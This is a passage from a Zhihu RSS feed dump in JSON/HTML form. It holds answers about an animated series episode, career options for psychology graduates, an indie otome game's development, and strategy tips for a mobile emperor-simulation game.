href=\"http://www.zhihu.com/people/virunce?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Yuro</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/461539120/answer/1920212609?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">67 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/469940341?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待明日方舟的一键领取功能？</a><br><a href=\"http://www.zhihu.com/question/469788139?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《明日方舟》二周年过后的风评持续下滑？</a><br>\n","link":"http://www.zhihu.com/question/461539120/answer/1920212609?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价《画江湖之不良人》第四季第十二集？","date":"2021-07-01 11:30:07","description":"\n<p>终于快迎来结局了，其实最后一集片子的音效我现在还没完全通过，今天少说点，得赶紧去工作啦。下周最后一更多写，写一堆。</p>\n<p><br></p>\n<p>先感谢赵梦娇小姐姐<i>（蚩梦/鲜参 CV）</i>。</p>\n<p><br></p>\n<p>《花腰带》这首歌早先其实并没有安排两个版本，她唱的版本是后来加的。原因是这首歌成品出来后，我总觉的鲜参年轻的时候一开口是原生态腔有点儿奇怪，因此才有的《花腰带》CV版。</p>\n<p><br></p>\n<p><b>这首歌是没有报酬的，咱娇姐送的！</b>当然饭是管的，我记得录完歌请她吃了顿火锅……</p>\n<p>发布的歌曲中是没有最后一段弦乐的，是因当时做片子时我觉得空所以后加的。</p>\n<a href=\"https://www.zhihu.com/zvideo/1393924776298246144\">12集草配</a><p><i>（很早以前拍摄的，请忽略我给鲜参草配的台词。制作镜头时没有最后的这段弦乐，我只能一边剪辑一边嘴配，贼逗。最后出片子前再交给毛亮老师按我嘴配的加了这部分。其实有时候剪烦躁了，连音效我都嘴配……叮咣咚唰的。这里顺便给自己邀个功，不良人4是我配音的处女作，哈哈哈！基本上旧部打斗那些喊叫奸笑都是我跟镜头导演任伟杰配的，第五季的导演也被我拉过来配过群杂角色——不过群杂里的男一，绝对是我！）</i></p>\n<p>本集略有些伤感，李偘、李星云他们也做了该做的事——正所谓，我不入地狱，谁入地狱。蚩离、鲜参也完成了他们这一辈人该做的事，弥补了当年犯下的错误。本季最终结局下周就要来了，我这里关于剧情也不多讲了，每个人看剧时都会有不同的感受，其实就我个人而言我倒是没有觉得很虐，但杨磊大大就觉得虐，还发了微博强调这个事。。。。。总之，喜欢看的小伙伴们就请继续看吧。</p>\n<p>下周主要说一下蚩梦的情感线，以及这个人物的由来等，包括尤川的问题，会一并聊。</p>\n<p>最后，百年荣光，普天同庆。</p>\n<p>但任重而道远，吾辈当自强，祝祖国繁荣昌盛 ！ </p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/cheng-zi-duo-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">橙子多</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/467933480/answer/1972409154?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">139 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/464286335?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待《画江湖之不良人》第四季第10集？</a><br><a href=\"http://www.zhihu.com/question/462893407?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《画江湖之不良人》第四季第9集？</a><br>\n","link":"http://www.zhihu.com/question/467933480/answer/1972409154?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"2021 年高考生想选心理学专业，好找工作吗？工资多少？就业方向和就业前景怎么样？","date":"2021-07-01 05:30:09","description":"\n<p>学心理学的人，毕业之后能做什么工作？</p>\n<p>都去做心理咨询师么？当然不是。</p>\n<p>继续做科研？可以呀，但也当然不是唯一的选择。</p>\n<p>《心理学职业发展手册》，由北京师范大学心理学部社会实践队出品，自2015年起，深度访谈在社会各领域心理学人，讲述生涯故事，希望全方位介绍心理学专业毕业生在毕业后可选择的职业方向与行业情况。</p>\n<p>学堂君在这个回答下面重新发布一下手册的完整目录，供心理学生或即将就读于心理学专业的同学翻阅了解。</p>\n<h2><b>高校教师</b></h2>\n<p><img src=\"https://pic4.zhimg.com/v2-e7b375120927ff15a8a017a4d21206b5_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1527\" data-watermark=\"original\" data-original-src=\"v2-e7b375120927ff15a8a017a4d21206b5\" data-watermark-src=\"v2-10f11376ddf7be462a776ab28e265b43\" data-private-watermark-src=\"v2-469493b9cf8cc20001135e010463122f\"></p>\n<p>在我国高校中，高校教师一般分为教学科研、工程实验员和行政管理等几类岗位。本节聚焦于承担教学科研任务的高校教师。</p>\n<p>有别于在研究院所中开展研究的科研工作者，高校教师一般需要承担科研和教学两方面的任务，发展过程中，还可能兼任系主任、副院长、院长等行政工作。除本专业外，心理学背景的科研工作者还广泛活跃于教育学、教育技术、行为经济学、人力资源管理、公共管理等院系部所。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/fLpSoSt49LVt1G1v6JXUhg\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">当学心理的人留在高校成为教师 | 心理学职业发展手册</a> </p>\n<h2>用户体验</h2>\n<p><img src=\"https://pic4.zhimg.com/v2-2ca7b433867b7e6821e5248e0765a4cc_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-2ca7b433867b7e6821e5248e0765a4cc\" data-watermark-src=\"v2-39838cccaf4380249da2df543ad9573b\" data-private-watermark-src=\"v2-0cb4fde68f03c5f40ba65bed13946c5f\"></p>\n<p>用户体验是用户在使用产品的过程中感受的总和，通俗来讲就是“这个东西好不好用、方不方便”。用户体验行业旨在为用户解决基本功能问题，提升产品的使用感受，满足用户的情感诉求。用户体验针对的产品不局限在实物，也包括虚拟产品，比如手机应用、服务等等。目前，各种各样的行业都已经逐渐意识到了提升用户体验对于产品开发与推广的重要性，并在公司内设立相关的部门。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/8wVu3X_5JU-JWUquaEEGGg\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">学心理的人“让产品更好用” | 心理学职业发展手册</a> </p>\n<h2>市场研究</h2>\n<p><img src=\"https://pic4.zhimg.com/v2-726bc306302a8d10543d2a8c4532f0d4_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-726bc306302a8d10543d2a8c4532f0d4\" data-watermark-src=\"v2-33eb3aad44f733d8e3031beabe84455d\" data-private-watermark-src=\"v2-c5b734db735f868793eaf51f2043cdf3\"></p>\n<p>市场研究公司是专业从事市场研究、市场调查、营销研究、满意度调查的专业公司。根据全球市场研究者协会的定义，市场研究公司接受其他组织的委托，为委托方需要进行的决策收集信息并进行专业性的研究活动。包括设计收集信息的方法、收集并管理数据、分析数据、得出相关结论等等。和战略咨询公司相比，市场研究公司偏重于科学、有效地收集中立的市场信息并作出分析，一般不对组织决策作出规划和指引，但可提出建议。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/zR2P63BHrVOwQpPi_sPS_Q\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理人如何研究市场 | 心理学职业发展手册</a> </p>\n<h2>考试研究</h2>\n<p><img src=\"https://pic1.zhimg.com/v2-0b121ba889b679b8008e4f8f5c08b607_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-0b121ba889b679b8008e4f8f5c08b607\" data-watermark-src=\"v2-498828c94bca70138cebf2fa874455c3\" data-private-watermark-src=\"v2-67e718461e57e94c0203d0dcb62555be\"></p>\n<p>对人才的选拔是心理测量学中一个重要的研究方向。在中国，有许多人才选拔是由国家的各大考试院或考试中心来统一组织的，包括高考、公务员考试、医学资格考试等等。在这些考试院或考试中心中，有大量的心理学人负责为大型统一考试命题，收集考试数据进行收集、分析，甚至为教育考试改革提供意见与建议。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/C7-RFf8GYzA9QqBttNs2Ag\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理学人能在考试中做什么 | 心理学职业发展手册</a> </p>\n<h2>心理咨询</h2>\n<p><img src=\"https://pic2.zhimg.com/v2-e6acf9775827fc921f1d2a8378a42873_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"762\" data-rawheight=\"1082\" data-watermark=\"original\" data-original-src=\"v2-e6acf9775827fc921f1d2a8378a42873\" data-watermark-src=\"v2-22852cfa3329d02491c5d9e79bc94920\" data-private-watermark-src=\"v2-d71f4e3fb0cfbd3cd2729ade8d11daa8\"></p>\n<p>心理咨询是指用一些专业的流派方法，通过语言交流或者一些互动活动来帮助来访者解决一些心理上的阻碍、促进来访者的交流沟通的一种专业帮助形式。许多大型公立的组织机构设立了心理咨询师的职位，如学校、残联、养老院等等，为组织内部的成员提供心理健康服务，解决相关心理问题（见高校心理咨询中心一章）。</p>\n<p>在在本章中，我们主要介绍在私立营利的心理咨询机构中工作的职业心理咨询师的工作。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/O58Yc9kdo_OSBN0GHsvFGQ\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">成就感与压力并存的助人者——心理咨询师 | 心理学职业发展手册</a> </p>\n<h2>高校心理咨询</h2>\n<p><img src=\"https://pic1.zhimg.com/v2-ce51cc709bb8a90e4b73069a153c10a8_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-ce51cc709bb8a90e4b73069a153c10a8\" data-watermark-src=\"v2-8e7bfba999b2e9a6c4a5b41ebef94fc0\" data-private-watermark-src=\"v2-669cb11a8aee20e6a642f8ff19147d34\"></p>\n<p>近年来，由于国家对大学生心理健康工作的重视和支持，大部分高校都设立了心理咨询中心，负责开展面对在校学生的心理咨询和心理健康教育。同时，根据不同高校对心理健康重视程度的不同，以及心理咨询中心行政从属关系的不同，咨询师往往还需要同时进行其他相关工作，如开展培训、讲座、心理健康活动等等。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Ri_cfG5T2LZqmoxL5KVHMw\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">高校心理咨询师篇 | 心理学职业发展手册</a> </p>\n<h2>生涯规划师</h2>\n<p><img src=\"https://pic3.zhimg.com/v2-0101c6d2e28f4bd9f1b35f6964a2c8ba_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"754\" data-rawheight=\"1068\" data-watermark=\"original\" data-original-src=\"v2-0101c6d2e28f4bd9f1b35f6964a2c8ba\" data-watermark-src=\"v2-e7ca85442ed7927d196cd3f770878fb0\" data-private-watermark-src=\"v2-4f6ce481f4bbf85f4c5db5273580eae0\"></p>\n<p>生涯规划师是针对个人的具体情况，通过测试、咨询、诊断、规划等方式，运用科学的测评工具，引导来访者客观地认识自己，调适自己的职业状态，制定合理的职业发展规划的专业人士。大多数生涯规划师供职于生涯规划公司，根据工作内容，又细分为咨询师和培训师。前者更多接受来访者一对一的咨询，而后者通过网络课程、现场讲座等方式向参与者提供生涯规划技巧。</p>\n<p>在生涯规划公司中，除了直接为客户提供职业咨询服务的咨询师和培训师，还有大量的支持性部门。如负责开发相关测验的测评部门、负责营销推广的市场部门等等。这些部门无疑也需要大量的心理学专业人才，但因为他们的工作内容和节奏与市场研究、考试研究行业中的研究型岗位都有相似之处，所以在本章中不再做详细介绍，而只聚焦于规划师的工作内容。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/hPvxGGX-OEb0BtFbErb9Wg\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">生涯规划师篇 | 心理学职业发展手册</a> </p>\n<h2>心理学传播</h2>\n<p><img src=\"https://pic1.zhimg.com/v2-8cb6767bc7d7bb9427dc4e1087b99d1c_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-8cb6767bc7d7bb9427dc4e1087b99d1c\" data-watermark-src=\"v2-20dcc4962260f142ac44e12ad24d2230\" data-private-watermark-src=\"v2-5d5c521bbd3c522294ea92d54b0cbb79\"></p>\n<p>随着社会大众对心理健康的日益重视，普及与传播心理学知识、帮助人们了解自身和他人成为了心理学人的重要使命之一。除传统出版行业外，包括微信公众号、短视频、知乎等在内的多种形式的心理学传播机构也应运而生，从而创造出了大量需要心理学专业人才的岗位。</p>\n<p>由于心理学传播的形式多种多样，工作职责也各不相同，在本章中，我们将主要介绍传统纸质出版编辑和心理学科普公众号编辑两种差距较大、且较具代表性的工作岗位。同为心理学传播行业，传统出版行业的编辑工作更加稳定、专业和严谨；而公众号编辑的工作则更需要创造力、感知和追逐热点的能力。总之，这些形式和内容各异的岗位，为有志于心理学传播的心理学专业学生提供了多元的选择。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/XqyOfhICOeWW722N46s9Dg\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">在出版界和新媒体发声的心理人 | 心理学职业发展手册</a> </p>\n<h2>中小学心理老师</h2>\n<p><img src=\"https://pic2.zhimg.com/v2-4409e6d946296a692a02ff253fbc7627_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-4409e6d946296a692a02ff253fbc7627\" data-watermark-src=\"v2-a29745b681767a426376ad79b00abb10\" data-private-watermark-src=\"v2-0ff7e7c9545dc4674de24d669b86e08c\"></p>\n<p>中小学校心理老师是对所在学校进行心理健康教育建设工作，通过课程、咨询等手段改善师生心理健康状况，以达到促进学生健康成长、改善老师工作环境等目的的职业。目前，越来越多的中小学校开始重视心理健康教育。大部分中小学校也都配备了专职的心理教师。</p>\n<p>相较于在高校心理咨询中心工作的心理老师，中小学校的心理老师与全体学生的联系更加紧密，面对的学生群体的年龄、主要心理困惑也不太相同。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/UKErgp5dP0yhKYKus3g1MA\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理人在中小学当老师 | 心理学职业发展手册</a> </p>\n<h2>人力资源</h2>\n<p><img src=\"https://pic1.zhimg.com/v2-261b8008e0e00970f41f7542d71ac5ab_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-261b8008e0e00970f41f7542d71ac5ab\" data-watermark-src=\"v2-c561298a3865f8549275ee9adf15778f\" data-private-watermark-src=\"v2-308e30df3940e195cf823285f155bd34\"></p>\n<p>人力资源部门（Human Resource，后文简称为HR部门）作为企业重要的支持性部门，负责对员工的薪酬、绩效、技能培养等进行管理。无论是哪一行业、哪一类型的企业，都会设立HR部门；同时，人力资源部门的工作内容和部门地位也受到企业本身较大程度的影响。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/C1LRRCV9b0ZdmIWmNLts6A\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理人如何跟“人力”打交道 | 心理学职业发展手册</a></p>\n<h2>管理咨询</h2>\n<p><img src=\"https://pic2.zhimg.com/v2-cd4d425510c53b34281d33364e188b44_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-cd4d425510c53b34281d33364e188b44\" data-watermark-src=\"v2-b01012cbd64ae9892297589e0a03f82a\" data-private-watermark-src=\"v2-254d88e02409833f8c00b1ff512d2374\"></p>\n<p>管理咨询是由专家找出企业经营战略和经营管理上存在的问题，分析原因，提出改进方案的过程。而管理咨询顾问就如同企业的“医生”，负责为提出委托的企业提供诊断和治疗方案。</p>\n<p>目前，管理咨询分为战略咨询和人力资源咨询两大种。战略咨询偏向企业的经营与发展，与经济学、市场营销等关系较大；而人力资源咨询主要解决企业在人力资源管理过程中存在的问题，为企业提供员工招聘、绩效考核方案设计、薪酬体系规划、公司文化建立、员工培训等服务，是心理学人较多进入的行业。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/oQM-ZBV80iW8_cr2F-gLyQ\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理人在企业当“医生” | 心理学职业发展手册</a> </p>\n<h2><b>心理学人还会去哪儿</b></h2>\n<p><img src=\"https://pic4.zhimg.com/v2-a75da85ec00f2fc4c8c73e33ea5c2dc1_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2043\" data-watermark=\"original\" data-original-src=\"v2-a75da85ec00f2fc4c8c73e33ea5c2dc1\" data-watermark-src=\"v2-5b0e53d15b508c138efe18efa644d88a\" data-private-watermark-src=\"v2-1045cc8fb4116f40ca4bf8911a765392\"></p>\n<p>心理学作为与人和社会有关的学科，与各种职业、各种工作都有一定的联系。心理学人的职业生涯选择也因此而变得格外多元。各行各业中都遍布心理学人的身影。那么，除了前十一章中所谈到的行业外，其他的心理学人都在哪里工作呢？</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/V9m9Nk1CUEkq9xoXp5J4uA\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理学人还会去哪儿 | 心理学职业发展手册</a> </p>\n<p><br></p>\n<p><br></p>\n<p>作者：心理学生涯人物访谈实践队</p>\n<p>相关原文：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/czMDSl8rco4lGsxVchVTSw\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">这本手册告诉你心理人在做什么工作 | 2018年终福利</a></p>\n<p>欢迎关注心理学科普平台<a href=\"https://www.zhihu.com/people/f3260f05df264ee916da258e1384e247\" class=\"internal\">@京师心理大学堂</a>，北京师范大学心理学部出品，奉献百年积淀，带你脑洞大开。任何形式的转载请知乎私信联系。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jing-shi-xin-li-da-xue-tang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">京师心理大学堂</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/459989284/answer/1971264035?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">25 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/328706095?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">对于2019 入学的准大学生来说，哪些专业就业前景「亮红灯」，需要加以警惕？</a><br><a href=\"http://www.zhihu.com/question/459989326?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2021 年高考生想选能源动力专业，好找工作吗？工资多少？就业方向和就业前景怎么样？</a><br>\n","link":"http://www.zhihu.com/question/459989284/answer/1971264035?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价单机乙女向游戏《风起长安：驭骨人》？","date":"2021-06-30 11:30:10","description":"\n<p>大家好，我是《风起长安·驭骨人》的制作人非离，同时也担任了剧本写作和演出设计的工作。</p>\n<p>很高兴能在知乎上与大家聊聊我们新上线的这款乙女向单机游戏。</p>\n<p>这一作的诞生原因很多，但总归来说，是我们有故事希望能讲给大家听。</p>\n<p>作为一个因共同兴趣聚拢在一起的制作组，我们面临的问题很多，如大家所说……主要是资金问题。等到资金问题稍有缓解时，《风起长安·驭骨人》已经封包小半年了，这一点现在想来也很遗憾。</p>\n<p>游戏发售后，我看到最多的反馈是世界观很大，但剧本太短，很多问题没讲清楚。</p>\n<p>之前我有说过，《风起长安·驭骨人》是我们的心血之作，也必定成为遗憾之作。</p>\n<p>为了游戏能较完整地出现在大家面前，我将女主设置为非漩涡中心的人物，省去了大篇幅的权力斗争剧情，能更专注于感情线。</p>\n<p>同时我注意到许多玩家表达了对本作中其他女性角色的喜欢，我非常开心。除去男女主的情感描写，塑造女角色之间的友谊是我非常珍视的部分。</p>\n<p>制作时，我对剧情进行了优先级划分，最终将有限的资金分配到制作较为重要的主线剧情上，忍痛舍弃了部分支线剧情，包括其他角色剧情、回忆剧情等。</p>\n<p>这么做的益处很多：我能将剧情演出做得更为精致、细腻，做到了多CG、全语音配置，能一遍遍去磨演出设计、反复测试那0.5秒与1秒的视觉差别。</p>\n<p>缺点也很明显——世界观没铺开，给玩家留下了不少疑问。</p>\n<p>但好在《风起长安》初步构建了一个驭骨人的世界，后续我们会在同一世界观下继续制作新游戏。</p>\n<p>能走到今天，非常感谢玩家们的包容，能够包容我们的缺点、对我们进行鼓励。</p>\n<p>在此还要感谢发行商咕咕工作室，在我们最困难、几乎无以为继的时候提供了很多支持，《风起长安》能顺利做完，离不开咕咕小姐姐们的全力支援。</p>\n<p>目前我们已经在规划新作，非常感谢玩家对轻梨工作室的支持，我们会继续坚持下去。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/qing-li-gong-zuo-shi?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">轻梨工作室</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/464467926/answer/1968625798?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/413716759?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为何手游《江南百景图》没有常州府？</a><br><a href=\"http://www.zhihu.com/question/266297957?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">网易游戏为什么大多是和风游戏（手游）？</a><br>\n","link":"http://www.zhihu.com/question/464467926/answer/1968625798?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"游戏《皇帝成长计划2》攻略有哪些？","date":"2021-06-29 15:30:07","description":"\n<p></p>\n<hr>\n<p>好兄弟们，我大一了，来更新了</p>\n<p>对本篇内容进行了更新与修改</p>\n<p>我创立了一个公众号叫【羊村大战魔仙堡】</p>\n<p>我这里面分类了一下攻略 希望更能清楚明了的帮到大家</p>\n<p>现在内容还比较少 但是在陆续更新 欢迎大家关注</p>\n<p>没有关注也没关系，会在知乎更新的哟</p>\n<hr>\n<p>这个游戏从小学大概4年级就开始玩了               现在高三了                                                              出来手游版                                                               越来越好啦                                                                                                                           </p>\n<p>有人看就再总结一下我玩的经验(个人总结，可能不够准确)：</p>\n<p><b>最最最重要的一点：一定要养成存档的好习惯!玩稍微久一点就黑屏，就什么都没有了!!!</b></p>\n<p>目前没有苹果手机的版本 但是苹果端玩家可以浏览器搜索皇帝成长计划2h5 点进4399在线玩(好消息，苹果端在2020.10.10上线啦！)</p>\n<p>1.前期最好不要过多招兵买马，容易破产</p>\n<p>2.前期多多贸易，能够让你不用克制去嚯嚯钱(推荐存档后再开始第二月，尽量刷成盈利)</p>\n<p>3.没钱可以尝试去东厂——查看把柄——东厂查办犯事官员——依法处理 可能抄家收获不菲</p>\n<p>4.智能建设才是根本上增加国库的！！！每天请坚持！！！</p>\n<p>5.<b>刷属性</b>：前期我一般都郊外先刷体能 然后尽量智慧多刷武力少刷 一般后期后期我都会让体能 智慧 武力 道德都700以上(为了教育皇子)</p>\n<p>6.<b>刷近臣</b>推荐的性格是：聪明 理想 独立(送礼多)</p>\n<p>7.我觉得<b>御医楼</b>的最高位置最好刷到4(能够省时间：一般+35 特殊全满 )</p>\n<p>8.培养皇子的话，最好不要太快立为太子，先派遣历练，如果已经立了的话，也可以通过送珍宝加属性(和大臣一样)</p>\n<p>9.皇子派遣历练：尽量选<b>出任幕僚</b>吧 加的属性一般多一点(不要忘记去宗人府或者养心殿给他们奖赏) 有些<b>皇子出游</b>会带粽子(+12大臣亲密度)之类的宝物，需要就选(不保险，可能会减属性)</p>\n<p>10.腊月和八月的晌午我一般都回去<b>御膳房</b>举办宴会(上限是50大臣)</p>\n<p>11.一般二月你去找道士前 你去青炉房炼什么药 他就给你什么药</p>\n<p>12.<b>打仗</b>先打日本(简单) 最后再打把安南、大理等小国(他们是材料获取的主要方式)                      打仗的时候好的将领真的很重要(能发动技能)！                                           而且打仗时人数多一倍以上的话最好选全面攻击        人数不多就突袭</p>\n<p>13.前期丞相一定是要先安排属性高的 天灾人祸国库遭不住</p>\n<p>14.知府要野心小 道德高(起义也遭不住)               高智商、高道德的地方官会减少贪污，提高地方的经济。</p>\n<p>15.在丞相是名臣后最好每天都要科举，10个蓝臣必出一个90+的蓝臣。</p>\n<p>16.第一年五月去云渡湖钓鱼送名臣(林烟or重庆)和一个名妃(春晖仙女)</p>\n<p>17.大雁塔太香了！真的推荐！(玩法已放在最下面)</p>\n<p><a class=\"member_mention\" href=\"http://www.zhihu.com/people/b18e9edf8bf2694f2620da4c9edb4eba\" data-hash=\"b18e9edf8bf2694f2620da4c9edb4eba\" data-hovercard=\"p$b$b18e9edf8bf2694f2620da4c9edb4eba\">@友善的眼神</a> 评论区的大佬，我觉得很有道理，大家可以参考一下下</p>\n<p><img src=\"https://pic4.zhimg.com/v2-69fc109391ab6be135278c512583263d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"959\" data-rawheight=\"818\" data-watermark=\"watermark\" data-original-src=\"v2-69fc109391ab6be135278c512583263d\" data-watermark-src=\"v2-6b9051c86362c1ced40e78f8d0617ca8\" data-private-watermark-src=\"v2-a48db9e169447748f38ec170d65852f1\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0b30f6205e48ebebaa73e23f3e7bc4e2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"1378\" data-watermark=\"watermark\" data-original-src=\"v2-0b30f6205e48ebebaa73e23f3e7bc4e2\" data-watermark-src=\"v2-894556cc4b0556832dc9f61edfc12b5a\" data-private-watermark-src=\"v2-c1c0664b26da7322829190d826368bbf\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-bed2370198b00328a4ae71a15652bb9d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"1180\" data-watermark=\"watermark\" data-original-src=\"v2-bed2370198b00328a4ae71a15652bb9d\" data-watermark-src=\"v2-e34f3fa5ef6454fd5f61b32df91f3574\" data-private-watermark-src=\"v2-7b1a2f73944b0c24a0fa2665d7a90674\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f81c85deddf69bccea2cadd329dd9374_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"450\" data-rawheight=\"85\" data-watermark=\"watermark\" data-original-src=\"v2-f81c85deddf69bccea2cadd329dd9374\" data-watermark-src=\"v2-289a93acebfe87fce9034a0c4f7d676c\" data-private-watermark-src=\"v2-39f77a69e4cc648f1f39e02d46eba571\"></p>\n<p>以下是大佬们的总结：</p>\n<h2><b>一、特殊事件事件/人物</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/7vhfTVLwQstOYXcA_mGH5A\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-47c78d5eca948d9046c559ea106790bb_bh.jpg\" data-image-width=\"779\" data-image-height=\"332\" class=\" wrap external\" target=\"_blank\" 